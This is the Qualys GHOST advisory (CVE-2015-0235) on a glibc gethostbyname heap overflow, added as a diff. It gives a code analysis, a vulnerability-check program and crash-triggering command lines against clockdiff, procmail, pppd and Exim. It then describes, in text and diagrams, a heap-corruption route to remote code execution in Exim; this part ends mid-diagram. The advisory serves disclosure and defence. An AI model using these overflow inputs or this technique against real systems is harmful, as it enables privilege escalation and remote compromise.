@@ -1,0 +1,884 @@
+
+Date: Tue, 27 Jan 2015 08:35:18 -0800
+From: Qualys Security Advisory <qsa@...lys.com>
+To: bugtraq@...urityfocus.com
+Subject: Qualys Security Advisory CVE-2015-0235 - GHOST: glibc gethostbyname
+ buffer overflow
+
+
+Qualys Security Advisory CVE-2015-0235
+
+GHOST: glibc gethostbyname buffer overflow
+
+
+--[ Contents ]----------------------------------------------------------------
+
+1 - Summary
+2 - Analysis
+3 - Mitigating factors
+4 - Case studies
+5 - Exploitation
+6 - Acknowledgments
+
+
+--[ 1 - Summary ]-------------------------------------------------------------
+
+During a code audit performed internally at Qualys, we discovered a
+buffer overflow in the __nss_hostname_digits_dots() function of the GNU
+C Library (glibc). This bug is reachable both locally and remotely via
+the gethostbyname*() functions, so we decided to analyze it -- and its
+impact -- thoroughly, and named this vulnerability "GHOST".
+
+Our main conclusions are:
+
+- Via gethostbyname() or gethostbyname2(), the overflowed buffer is
+  located in the heap. Via gethostbyname_r() or gethostbyname2_r(), the
+  overflowed buffer is caller-supplied (and may therefore be located in
+  the heap, stack, .data, .bss, etc; however, we have seen no such call
+  in practice).
+
+- At most sizeof(char *) bytes can be overwritten (ie, 4 bytes on 32-bit
+  machines, and 8 bytes on 64-bit machines). Bytes can be overwritten
+  only with digits ('0'...'9'), dots ('.'), and a terminating null
+  character ('\0').
+
+- Despite these limitations, arbitrary code execution can be achieved.
+  As a proof of concept, we developed a full-fledged remote exploit
+  against the Exim mail server, bypassing all existing protections
+  (ASLR, PIE, and NX) on both 32-bit and 64-bit machines. We will
+  publish our exploit as a Metasploit module in the near future.
+
+- The first vulnerable version of the GNU C Library is glibc-2.2,
+  released on November 10, 2000.
+
+- We identified a number of factors that mitigate the impact of this
+  bug. In particular, we discovered that it was fixed on May 21, 2013
+  (between the releases of glibc-2.17 and glibc-2.18). Unfortunately, it
+  was not recognized as a security threat; as a result, most stable and
+  long-term-support distributions were left exposed (and still are):
+  Debian 7 (wheezy), Red Hat Enterprise Linux 6 & 7, CentOS 6 & 7,
+  Ubuntu 12.04, for example.
+
+
+--[ 2 - Analysis ]------------------------------------------------------------
+
+The vulnerable function, __nss_hostname_digits_dots(), is called
+internally by the glibc in nss/getXXbyYY.c (the non-reentrant version)
+and nss/getXXbyYY_r.c (the reentrant version). However, the calls are
+surrounded by #ifdef HANDLE_DIGITS_DOTS, a macro defined only in:
+
+- inet/gethstbynm.c
+- inet/gethstbynm2.c
+- inet/gethstbynm_r.c
+- inet/gethstbynm2_r.c
+- nscd/gethstbynm3_r.c
+
+These files implement the gethostbyname*() family, and hence the only
+way to reach __nss_hostname_digits_dots() and its buffer overflow. The
+purpose of this function is to avoid expensive DNS lookups if the
+hostname argument is already an IPv4 or IPv6 address.
+
+The code below comes from glibc-2.17:
+
+ 35 int
+ 36 __nss_hostname_digits_dots (const char *name, struct hostent *resbuf,
+ 37                             char **buffer, size_t *buffer_size,
+ 38                             size_t buflen, struct hostent **result,
+ 39                             enum nss_status *status, int af, int *h_errnop)
+ 40 {
+ ..
+ 57   if (isdigit (name[0]) || isxdigit (name[0]) || name[0] == ':')
+ 58     {
+ 59       const char *cp;
+ 60       char *hostname;
+ 61       typedef unsigned char host_addr_t[16];
+ 62       host_addr_t *host_addr;
+ 63       typedef char *host_addr_list_t[2];
+ 64       host_addr_list_t *h_addr_ptrs;
+ 65       char **h_alias_ptr;
+ 66       size_t size_needed;
+ ..
+ 85       size_needed = (sizeof (*host_addr)
+ 86                      + sizeof (*h_addr_ptrs) + strlen (name) + 1);
+ 87
+ 88       if (buffer_size == NULL)
+ 89         {
+ 90           if (buflen < size_needed)
+ 91             {
+ ..
+ 95               goto done;
+ 96             }
+ 97         }
+ 98       else if (buffer_size != NULL && *buffer_size < size_needed)
+ 99         {
+100           char *new_buf;
+101           *buffer_size = size_needed;
+102           new_buf = (char *) realloc (*buffer, *buffer_size);
+103
+104           if (new_buf == NULL)
+105             {
+...
+114               goto done;
+115             }
+116           *buffer = new_buf;
+117         }
+...
+121       host_addr = (host_addr_t *) *buffer;
+122       h_addr_ptrs = (host_addr_list_t *)
+123         ((char *) host_addr + sizeof (*host_addr));
+124       h_alias_ptr = (char **) ((char *) h_addr_ptrs + sizeof (*h_addr_ptrs));
+125       hostname = (char *) h_alias_ptr + sizeof (*h_alias_ptr);
+126
+127       if (isdigit (name[0]))
+128         {
+129           for (cp = name;; ++cp)
+130             {
+131               if (*cp == '\0')
+132                 {
+133                   int ok;
+134
+135                   if (*--cp == '.')
+136                     break;
+...
+142                   if (af == AF_INET)
+143                     ok = __inet_aton (name, (struct in_addr *) host_addr);
+144                   else
+145                     {
+146                       assert (af == AF_INET6);
+147                       ok = inet_pton (af, name, host_addr) > 0;
+148                     }
+149                   if (! ok)
+150                     {
+...
+154                       goto done;
+155                     }
+156
+157                   resbuf->h_name = strcpy (hostname, name);
+...
+194                   goto done;
+195                 }
+196
+197               if (!isdigit (*cp) && *cp != '.')
+198                 break;
+199             }
+200         }
+...
+
+Lines 85-86 compute the size_needed to store three (3) distinct entities
+in buffer: host_addr, h_addr_ptrs, and name (the hostname). Lines 88-117
+make sure the buffer is large enough: lines 88-97 correspond to the
+reentrant case, lines 98-117 to the non-reentrant case.
+
+Lines 121-125 prepare pointers to store four (4) distinct entities in
+buffer: host_addr, h_addr_ptrs, h_alias_ptr, and hostname. The sizeof
+(*h_alias_ptr) -- the size of a char pointer -- is missing from the
+computation of size_needed.
+
+The strcpy() on line 157 should therefore allow us to write past the end
+of buffer, at most (depending on strlen(name) and alignment) 4 bytes on
+32-bit machines, or 8 bytes on 64-bit machines. There is a similar
+strcpy() after line 200, but no buffer overflow:
+
+236           size_needed = (sizeof (*host_addr)
+237                          + sizeof (*h_addr_ptrs) + strlen (name) + 1);
+...
+267           host_addr = (host_addr_t *) *buffer;
+268           h_addr_ptrs = (host_addr_list_t *)
+269             ((char *) host_addr + sizeof (*host_addr));
+270           hostname = (char *) h_addr_ptrs + sizeof (*h_addr_ptrs);
+...
+289                   resbuf->h_name = strcpy (hostname, name);
+
+In order to reach the overflow at line 157, the hostname argument must
+meet the following requirements:
+
+- Its first character must be a digit (line 127).
+
+- Its last character must not be a dot (line 135).
+
+- It must comprise only digits and dots (line 197) (we call this the
+  "digits-and-dots" requirement).
+
+- It must be long enough to overflow the buffer. For example, the
+  non-reentrant gethostbyname*() functions initially allocate their
+  buffer with a call to malloc(1024) (the "1-KB" requirement).
+
+- It must be successfully parsed as an IPv4 address by inet_aton() (line
+  143), or as an IPv6 address by inet_pton() (line 147). Upon careful
+  analysis of these two functions, we can further refine this
+  "inet-aton" requirement:
+
+  . It is impossible to successfully parse a "digits-and-dots" hostname
+    as an IPv6 address with inet_pton() (':' is forbidden). Hence it is
+    impossible to reach the overflow with calls to gethostbyname2() or
+    gethostbyname2_r() if the address family argument is AF_INET6.
+
+  . Conclusion: inet_aton() is the only option, and the hostname must
+    have one of the following forms: "a.b.c.d", "a.b.c", "a.b", or "a",
+    where a, b, c, d must be unsigned integers, at most 0xfffffffful,
+    converted successfully (ie, no integer overflow) by strtoul() in
+    decimal or octal (but not hexadecimal, because 'x' and 'X' are
+    forbidden).
+
+
+--[ 3 - Mitigating factors ]--------------------------------------------------
+
+The impact of this bug is reduced significantly by the following
+reasons:
+
+- A patch already exists (since May 21, 2013), and has been applied and
+  tested since glibc-2.18, released on August 12, 2013:
+
+        [BZ #15014]
+        * nss/getXXbyYY_r.c (INTERNAL (REENTRANT_NAME))
+        [HANDLE_DIGITS_DOTS]: Set any_service when digits-dots parsing was
+        successful.
+        * nss/digits_dots.c (__nss_hostname_digits_dots): Remove
+        redundant variable declarations and reallocation of buffer when
+        parsing as IPv6 address.  Always set NSS status when called from
+        reentrant functions.  Use NETDB_INTERNAL instead of TRY_AGAIN when
+        buffer too small.  Correct computation of needed size.
+        * nss/Makefile (tests): Add test-digits-dots.
+        * nss/test-digits-dots.c: New test.
+
+- The gethostbyname*() functions are obsolete; with the advent of IPv6,
+  recent applications use getaddrinfo() instead.
+
+- Many programs, especially SUID binaries reachable locally, use
+  gethostbyname() if, and only if, a preliminary call to inet_aton()
+  fails. However, a subsequent call must also succeed (the "inet-aton"
+  requirement) in order to reach the overflow: this is impossible, and
+  such programs are therefore safe.
+
+- Most of the other programs, especially servers reachable remotely, use
+  gethostbyname() to perform forward-confirmed reverse DNS (FCrDNS, also
+  known as full-circle reverse DNS) checks. These programs are generally
+  safe, because the hostname passed to gethostbyname() has normally been
+  pre-validated by DNS software:
+
+  . "a string of labels each containing up to 63 8-bit octets, separated
+    by dots, and with a maximum total of 255 octets." This makes it
+    impossible to satisfy the "1-KB" requirement.
+
+  . Actually, glibc's DNS resolver can produce hostnames of up to
+    (almost) 1025 characters (in case of bit-string labels, and special
+    or non-printable characters). But this introduces backslashes ('\\')
+    and makes it impossible to satisfy the "digits-and-dots"
+    requirement.
+
+
+--[ 4 - Case studies ]--------------------------------------------------------
+
+In this section, we will analyze real-world examples of programs that
+call the gethostbyname*() functions, but we first introduce a small test
+program that checks whether a system is vulnerable or not:
+
+[user@...ora-19 ~]$ cat > GHOST.c << EOF
+#include <netdb.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+
+#define CANARY "in_the_coal_mine"
+
+struct {
+  char buffer[1024];
+  char canary[sizeof(CANARY)];
+} temp = { "buffer", CANARY };
+
+int main(void) {
+  struct hostent resbuf;
+  struct hostent *result;
+  int herrno;
+  int retval;
+
+  /*** strlen (name) = size_needed - sizeof (*host_addr) - sizeof (*h_addr_ptrs) - 1; ***/
+  size_t len = sizeof(temp.buffer) - 16*sizeof(unsigned char) - 2*sizeof(char *) - 1;
+  char name[sizeof(temp.buffer)];
+  memset(name, '0', len);
+  name[len] = '\0';
+
+  retval = gethostbyname_r(name, &resbuf, temp.buffer, sizeof(temp.buffer), &result, &herrno);
+
+  if (strcmp(temp.canary, CANARY) != 0) {
+    puts("vulnerable");
+    exit(EXIT_SUCCESS);
+  }
+  if (retval == ERANGE) {
+    puts("not vulnerable");
+    exit(EXIT_SUCCESS);
+  }
+  puts("should not happen");
+  exit(EXIT_FAILURE);
+}
+EOF
+
+[user@...ora-19 ~]$ gcc GHOST.c -o GHOST
+
+On Fedora 19 (glibc-2.17):
+
+[user@...ora-19 ~]$ ./GHOST
+vulnerable
+
+On Fedora 20 (glibc-2.18):
+
+[user@...ora-20 ~]$ ./GHOST
+not vulnerable
+
+----[ 4.1 - The GNU C Library ]-----------------------------------------------
+
+The glibc itself contains a few calls to gethostbyname*() functions. In
+particular, getaddrinfo() calls gethostbyname2_r() if, but only if, a
+first call to inet_aton() fails: in accordance with the "inet-aton"
+requirement, these internal calls are safe. For example,
+eglibc-2.13/sysdeps/posix/getaddrinfo.c:
+
+      at->family = AF_UNSPEC;
+      ...
+      if (__inet_aton (name, (struct in_addr *) at->addr) != 0)
+        {
+          if (req->ai_family == AF_UNSPEC || req->ai_family == AF_INET)
+            at->family = AF_INET;
+          else if (req->ai_family == AF_INET6 && (req->ai_flags & AI_V4MAPPED))
+            {
+              ...
+              at->family = AF_INET6;
+            }
+          else
+            return -EAI_ADDRFAMILY;
+          ...
+        }
+      ...
+      if (at->family == AF_UNSPEC && (req->ai_flags & AI_NUMERICHOST) == 0)
+        {
+          ...
+              size_t tmpbuflen = 512;
+              char *tmpbuf = alloca (tmpbuflen);
+              ...
+                  rc = __gethostbyname2_r (name, family, &th, tmpbuf,
+                                           tmpbuflen, &h, &herrno);
+          ...
+        }
+
+----[ 4.2 - mount.nfs ]-------------------------------------------------------
+
+Similarly, mount.nfs (a SUID-root binary) is not vulnerable:
+
+        if (inet_aton(hostname, &addr->sin_addr))
+                return 0;
+        if ((hp = gethostbyname(hostname)) == NULL) {
+                nfs_error(_("%s: can't get address for %s\n"),
+                                progname, hostname);
+                return -1;
+        }
+
+----[ 4.3 - mtr ]-------------------------------------------------------------
+
+mtr (another SUID-root binary) is not vulnerable either, because it
+calls getaddrinfo() instead of gethostbyname*() functions on any modern
+(ie, IPv6-enabled) system:
+
+#ifdef ENABLE_IPV6
+  /* gethostbyname2() is deprecated so we'll use getaddrinfo() instead. */
+  ...
+  error = getaddrinfo( Hostname, NULL, &hints, &res );
+  if ( error ) {
+    if (error == EAI_SYSTEM)
+       perror ("Failed to resolve host");
+    else
+       fprintf (stderr, "Failed to resolve host: %s\n", gai_strerror(error));
+    exit( EXIT_FAILURE );
+  }
+  ...
+#else
+    host = gethostbyname(Hostname);
+  if (host == NULL) {
+    herror("mtr gethostbyname");
+    exit(1);
+  }
+  ...
+#endif
+
+----[ 4.4 - iputils ]---------------------------------------------------------
+
+------[ 4.4.1 - clockdiff ]---------------------------------------------------
+
+clockdiff is vulnerable in a straightforward manner:
+
+        hp = gethostbyname(argv[1]);
+        if (hp == NULL) {
+                fprintf(stderr, "clockdiff: %s: host not found\n", argv[1]);
+                exit(1);
+        }
+
+[user@...ora-19-32b ~]$ ls -l /usr/sbin/clockdiff
+-rwxr-xr-x. 1 root root 15076 Feb  1  2013 /usr/sbin/clockdiff
+
+[user@...ora-19-32b ~]$ getcap /usr/sbin/clockdiff
+/usr/sbin/clockdiff = cap_net_raw+ep
+
+[user@...ora-19-32b ~]$ /usr/sbin/clockdiff `python -c "print '0' * $((0x10000-16*1-2*4-1-4))"`
+.Segmentation fault
+
+[user@...ora-19-32b ~]$ /usr/sbin/clockdiff `python -c "print '0' * $((0x20000-16*1-2*4-1-4))"`
+Segmentation fault
+
+[user@...ora-19-32b ~]$ dmesg
+...
+[202071.118929] clockdiff[3610]: segfault at b86711f4 ip b75de0c6 sp bfc191f0 error 6 in libc-2.17.so[b7567000+1b8000]
+[202086.144336] clockdiff[3618]: segfault at b90d0d24 ip b75bb0c6 sp bf8e9dc0 error 6 in libc-2.17.so[b7544000+1b8000]
+
+------[ 4.4.2 - ping and arping ]---------------------------------------------
+
+ping and arping call gethostbyname() and gethostbyname2(), respectively,
+if and only if inet_aton() fails first. This time, however, there is
+another function call in between (Fedora, for example, does define
+USE_IDN):
+
+--------[ 4.4.2.1 - ping ]----------------------------------------------------
+
+                if (inet_aton(target, &whereto.sin_addr) == 1) {
+                        ...
+                } else {
+                        char *idn;
+#ifdef USE_IDN
+                        int rc;
+                        ...
+                        rc = idna_to_ascii_lz(target, &idn, 0);
+                        if (rc != IDNA_SUCCESS) {
+                                fprintf(stderr, "ping: IDN encoding failed: %s\n", idna_strerror(rc));
+                                exit(2);
+                        }
+#else
+                        idn = target;
+#endif
+                        hp = gethostbyname(idn);
+
+--------[ 4.4.2.2 - arping ]--------------------------------------------------
+
+        if (inet_aton(target, &dst) != 1) {
+                struct hostent *hp;
+                char *idn = target;
+#ifdef USE_IDN
+                int rc;
+
+                rc = idna_to_ascii_lz(target, &idn, 0);
+
+                if (rc != IDNA_SUCCESS) {
+                        fprintf(stderr, "arping: IDN encoding failed: %s\n", idna_strerror(rc));
+                        exit(2);
+                }
+#endif
+
+                hp = gethostbyname2(idn, AF_INET);
+
+--------[ 4.4.2.3 - Analysis ]------------------------------------------------
+
+If idna_to_ascii_lz() modifies the target hostname, the first call to
+inet_aton() could fail and the second call (internal to gethostbyname())
+could succeed. For example, idna_to_ascii_lz() transforms any Unicode
+dot-like character (0x3002, 0xFF0E, 0xFF61) into an ASCII dot (".").
+
+But it also restricts the length of a domain label to 63 characters:
+this makes it impossible to reach 1024 bytes (the "1-KB" requirement)
+with only 4 labels and 3 dots (the "inet-aton" requirement).
+
+Unless inet_aton() (actually, strtoul()) can be tricked into accepting
+more than 3 dots? Indeed, idna_to_ascii_lz() does not restrict the total
+length of a domain name. glibc supports "thousands' grouping characters"
+(man 3 printf); for example, sscanf(str, "%'lu", &ul) yields 1000 when
+processing any of the following input strings:
+
+- "1,000" in an English locale;
+- "1 000" in a French locale; and
+- "1.000" in a German or Spanish locale.
+
+strtoul() implements this "number grouping" too, but its use is limited
+to internal glibc functions. Conclusion: more than 3 dots is impossible,
+and neither ping nor arping is vulnerable.
+
+----[ 4.5 - procmail ]--------------------------------------------------------
+
+procmail (a SUID-root and SGID-mail binary) is vulnerable through its
+"comsat/biff" feature:
+
+#define COMSAThost      "localhost"    /* where the biff/comsat daemon lives */
+...
+#define SERV_ADDRsep    '@'           /* when overriding in COMSAT=serv@...r */
+
+int setcomsat(chp)const char*chp;
+{ char*chad; ...
+  chad=strchr(chp,SERV_ADDRsep);                             /* @ separator? */
+  ...
+  if(chad)
+     *chad++='\0';                                    /* split the specifier */
+  if(!chad||!*chad)                                               /* no host */
+#ifndef IP_localhost                          /* Is "localhost" preresolved? */
+     chad=COMSAThost;                                   /* nope, use default */
+#else /* IP_localhost */
+   { ...
+   }
+  else
+#endif /* IP_localhost */
+   { ...
+     if(!(host=gethostbyname(chad))||!host->h_0addr_list)
+
+user@...ian-7-2-32b:~$ ls -l /usr/bin/procmail
+-rwsr-sr-x 1 root mail 83912 Jun  6  2012 /usr/bin/procmail
+
+user@...ian-7-2-32b:~$ /usr/bin/procmail 'VERBOSE=on' 'COMSAT=@...ython -c "print '0' * $((0x500-16*1-2*4-1-4))"` < /dev/null
+...
+*** glibc detected *** /usr/bin/procmail: free(): invalid next size (normal): 0x0980de30 ***
+======= Backtrace: =========
+/lib/i386-linux-gnu/i686/cmov/libc.so.6(+0x70f01)[0xb76b2f01]
+/lib/i386-linux-gnu/i686/cmov/libc.so.6(+0x72768)[0xb76b4768]
+/lib/i386-linux-gnu/i686/cmov/libc.so.6(cfree+0x6d)[0xb76b781d]
+/usr/bin/procmail[0x80548ec]
+/lib/i386-linux-gnu/i686/cmov/libc.so.6(__libc_start_main+0xe6)[0xb7658e46]
+/usr/bin/procmail[0x804bb55]
+======= Memory map: ========
+...
+0980a000-0982b000 rw-p 00000000 00:00 0          [heap]
+...
+Aborted
+
+user@...ian-7-2-32b:~$ _COMSAT_='COMSAT=@...ython -c "print '0' * $((0x500-16*1-2*4-1-4))"`
+
+user@...ian-7-2-32b:~$ /usr/bin/procmail "$_COMSAT_" "$_COMSAT_"1234 < /dev/null
+Segmentation fault
+
+user@...ian-7-2-32b:~$ /usr/bin/procmail "$_COMSAT_"12345670 "$_COMSAT_"123456701234 < /dev/null
+Segmentation fault
+
+user@...ian-7-2-32b:~$ dmesg
+...
+[211409.564917] procmail[4549]: segfault at c ip b768e5a4 sp bfcb53d8 error 4 in libc-2.13.so[b761c000+15c000]
+[211495.820710] procmail[4559]: segfault at b8cb290c ip b763c5a4 sp bf870c98 error 4 in libc-2.13.so[b75ca000+15c000]
+
+----[ 4.6 - pppd ]------------------------------------------------------------
+
+pppd (yet another SUID-root binary) calls gethostbyname() if a
+preliminary call to inet_addr() (a simple wrapper around inet_aton())
+fails. "The inet_addr() function converts the Internet host address cp
+from IPv4 numbers-and-dots notation into binary data in network byte
+order. If the input is invalid, INADDR_NONE (usually -1) is returned.
+Use of this function is problematic because -1 is a valid address
+(255.255.255.255)." A failure for inet_addr(), but a success for
+inet_aton(), and consequently a path to the buffer overflow.
+
+user@...ntu-12-04-32b:~$ ls -l /usr/sbin/pppd
+-rwsr-xr-- 1 root dip 273272 Feb  3  2011 /usr/sbin/pppd
+
+user@...ntu-12-04-32b:~$ id
+uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
+
+------[ 4.6.1 - ms-dns option ]-----------------------------------------------
+
+static int
+setdnsaddr(argv)
+    char **argv;
+{
+    u_int32_t dns;
+    struct hostent *hp;
+
+    dns = inet_addr(*argv);
+    if (dns == (u_int32_t) -1) {
+        if ((hp = gethostbyname(*argv)) == NULL) {
+            option_error("invalid address parameter '%s' for ms-dns option",
+                         *argv);
+            return 0;
+        }
+        dns = *(u_int32_t *)hp->h_addr;
+    }
+
+user@...ntu-12-04-32b:~$ /usr/sbin/pppd 'dryrun' 'ms-dns' `python -c "print '0' * $((0x1000-16*1-2*4-16-4))"`'377.255.255.255'
+*** glibc detected *** /usr/sbin/pppd: free(): invalid next size (normal): 0x09c0f928 ***
+======= Backtrace: =========
+/lib/i386-linux-gnu/libc.so.6(+0x75ee2)[0xb75e1ee2]
+/lib/i386-linux-gnu/libc.so.6(+0x65db5)[0xb75d1db5]
+/lib/i386-linux-gnu/libc.so.6(fopen+0x2b)[0xb75d1deb]
+/usr/sbin/pppd(options_from_file+0xa8)[0x8064948]
+/usr/sbin/pppd(options_for_tty+0xde)[0x8064d7e]
+/usr/sbin/pppd(tty_process_extra_options+0xa4)[0x806e1a4]
+/usr/sbin/pppd(main+0x1cf)[0x8050b2f]
+/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb75854d3]
+======= Memory map: ========
+...
+09c0c000-09c2d000 rw-p 00000000 00:00 0          [heap]
+...
+Aborted (core dumped)
+
+------[ 4.6.2 - ms-wins option ]----------------------------------------------
+
+static int
+setwinsaddr(argv)
+    char **argv;
+{
+    u_int32_t wins;
+    struct hostent *hp;
+
+    wins = inet_addr(*argv);
+    if (wins == (u_int32_t) -1) {
+        if ((hp = gethostbyname(*argv)) == NULL) {
+            option_error("invalid address parameter '%s' for ms-wins option",
+                         *argv);
+            return 0;
+        }
+        wins = *(u_int32_t *)hp->h_addr;
+    }
+
+user@...ntu-12-04-32b:~$ /usr/sbin/pppd 'dryrun' 'ms-wins' `python -c "print '0' * $((0x1000-16*1-2*4-16-4))"`'377.255.255.255'
+*** glibc detected *** /usr/sbin/pppd: free(): invalid next size (normal): 0x08a64928 ***
+======= Backtrace: =========
+/lib/i386-linux-gnu/libc.so.6(+0x75ee2)[0xb757aee2]
+/lib/i386-linux-gnu/libc.so.6(+0x65db5)[0xb756adb5]
+/lib/i386-linux-gnu/libc.so.6(fopen+0x2b)[0xb756adeb]
+/usr/sbin/pppd(options_from_file+0xa8)[0x8064948]
+/usr/sbin/pppd(options_for_tty+0xde)[0x8064d7e]
+/usr/sbin/pppd(tty_process_extra_options+0xa4)[0x806e1a4]
+/usr/sbin/pppd(main+0x1cf)[0x8050b2f]
+/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb751e4d3]
+======= Memory map: ========
+...
+08a61000-08a82000 rw-p 00000000 00:00 0          [heap]
+...
+Aborted (core dumped)
+
+------[ 4.6.3 - socket option ]-----------------------------------------------
+
+static int
+open_socket(dest)
+    char *dest;
+{
+    char *sep, *endp = NULL;
+    int sock, port = -1;
+    u_int32_t host;
+    struct hostent *hent;
+    ...
+    sep = strchr(dest, ':');
+    if (sep != NULL)
+        port = strtol(sep+1, &endp, 10);
+    if (port < 0 || endp == sep+1 || sep == dest) {
+        error("Can't parse host:port for socket destination");
+        return -1;
+    }
+    *sep = 0;
+    host = inet_addr(dest);
+    if (host == (u_int32_t) -1) {
+        hent = gethostbyname(dest);
+        if (hent == NULL) {
+            error("%s: unknown host in socket option", dest);
+            *sep = ':';
+            return -1;
+        }
+        host = *(u_int32_t *)(hent->h_addr_list[0]);
+    }
+
+user@...ntu-12-04-32b:~$ /usr/sbin/pppd 'socket' `python -c "print '0' * $((0x1000-16*1-2*4-16-4))"`'377.255.255.255:1'
+user@...ntu-12-04-32b:~$ *** glibc detected *** /usr/sbin/pppd: malloc(): memory corruption: 0x09cce270 ***
+
+----[ 4.7 - Exim ]------------------------------------------------------------
+
+The Exim mail server is exploitable remotely if configured to perform
+extra security checks on the HELO and EHLO commands ("helo_verify_hosts"
+or "helo_try_verify_hosts" option, or "verify = helo" ACL); we developed
+a reliable and fully-functional exploit that bypasses all existing
+protections (ASLR, PIE, NX) on 32-bit and 64-bit machines.
+
+user@...ian-7-7-64b:~$ grep helo /var/lib/exim4/config.autogenerated | grep verify
+helo_verify_hosts = *
+
+user@...ian-7-7-64b:~$ python -c "print '0' * $((0x500-16*1-2*8-1-8))"
+000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+
+user@...ian-7-7-64b:~$ telnet 127.0.0.1 25
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+220 debian-7-7-64b ESMTP Exim 4.80 ...
+HELO 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+Connection closed by foreign host.
+
+user@...ian-7-7-64b:~$ dmesg
+...
+[ 1715.842547] exim4[2562]: segfault at 7fabf1f0ecb8 ip 00007fabef31bd04 sp 00007fffb427d5b0 error 6 in libc-2.13.so[7fabef2a2000+182000]
+
+
+--[ 5 - Exploitation ]--------------------------------------------------------
+
+----[ 5.1 - Code execution ]--------------------------------------------------
+
+In this section, we describe how we achieve remote code execution
+against the Exim SMTP mail server, bypassing the NX (No-eXecute)
+protection and glibc's malloc hardening.
+
+First, we overflow gethostbyname's heap-based buffer and partially
+overwrite the size field of the next contiguous free chunk of memory
+with a slightly larger size (we overwrite only 3 bytes of the size
+field; in any case, we cannot overflow more than 4 bytes on 32-bit
+machines, or 8 bytes on 64-bit machines):
+
+
+                            |< malloc_chunk
+                            |
+-----|----------------------|---+--------------------|-----
+ ... | gethostbyname buffer |p|s|f|b|F|B| free chunk | ...
+-----|----------------------|---+--------------------|-----
+     |                         X|
+     |------------------------->|
+               overflow
+
+where:
+
+struct malloc_chunk {
+
+  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
+  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */
+
+  struct malloc_chunk* fd;         /* double links -- used only if free. */
+  struct malloc_chunk* bk;
+
+  /* Only used for large blocks: pointer to next larger size.  */
+  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
+  struct malloc_chunk* bk_nextsize;
+};
+
+and: X marks the spot where the crucial memory corruption takes place.
+
+
+As a result, this artificially-enlarged free chunk, which is managed by
+glibc's malloc, overlaps another block of memory, Exim's current_block,
+which is managed by Exim's internal memory allocator:
+
+
+                            |< malloc_chunk          |< storeblock
+                            |                        |
+-----|----------------------|------------------------|---------------+---|-----
+ ... | gethostbyname buffer |p|s|f|b|F|B| free chunk |n|l| current_block | ...
+-----|----------------------|------------------------|---------------+---|-----
+                            |                                        |
+                            |<-------------------------------------->|
+                                 artificially enlarged free chunk
+
+where:
+
+typedef struct storeblock {
+  struct storeblock *next;
+  size_t length;
+} storeblock;
+
+
+Then, we partially allocate the enlarged free chunk and overwrite the
+beginning of Exim's current_block of memory (the "storeblock" structure)
+with arbitrary data. In particular, we overwrite its "next" field:
+
+
+                            |< malloc_chunk          |< storeblock
+                            |                        |
+-----|----------------------|------------------------|--------+----------|-----
+ ... | gethostbyname buffer |p|s|f|b|F|B| aaaaaaaaaa |n|l| current_block | ...
+-----|----------------------|------------------------|--------+----------|-----
+                            |                         X       |
+                            |<------------------------------->|
+                                      allocated chunk
+
+
+This effectively turns gethostbyname's buffer overflow into a
+write-anything-anywhere primitive, because we control both the pointer
+to the next block of memory returned by Exim's allocator (the hijacked
+"next" pointer) and the data allocated (a null-terminated string, the
+argument of an SMTP command we send to Exim).
+
+Finally, we use this write-anything-anywhere primitive to overwrite
+Exim's run-time configuration, which is cached in the heap memory. More
+precisely, we overwrite Exim's Access Control Lists (ACLs), and achieve
+arbitrary command execution thanks to Exim's "${run{<command> <args>}}"
+string expansion mechanism:
+
+                                                     |< storeblock
+                                                     |
+-----|-------------------------------|---------------|-------------------|-----
+ ... | Exim's run-time configuration | ... .. .. ... |n|l| current_block | ...
+-----|----x--------------------------|---------------|x------------------|-----
+          |                                           |
+          '<------------------------------------------'
+                      hijacked next pointer
+
+
+                |< ACLs >|
+-----|----+-----+--------+------+----|---------------|-------------------|-----
+ ... | Exim's run-time configuration | ... .. .. ... | old current_block | ...
+-----|----+-----+--------+------+----|---------------|-------------------|-----
+          |      XXXXXXXX       |
+          |<------------------->|
+             new current_block
+
+
+----[ 5.2 - Information leak ]------------------------------------------------
+
+The success of this exploit depends on an important piece of
+information: the address of Exim's run-time configuration in the heap.
+In this section, we describe how we obtain this address, bypassing the
+ASLR (Address Space Layout Randomization) and PIE (Position Independent
+Executable) protections.
+
+First, we overflow gethostbyname's heap-based buffer and partially
+overwrite the size field of the next contiguous free chunk of memory
+with a slightly larger size:
+
+
+                            |< malloc_chunk
+                            |
+-----|----------------------|---+-------------------------|-----
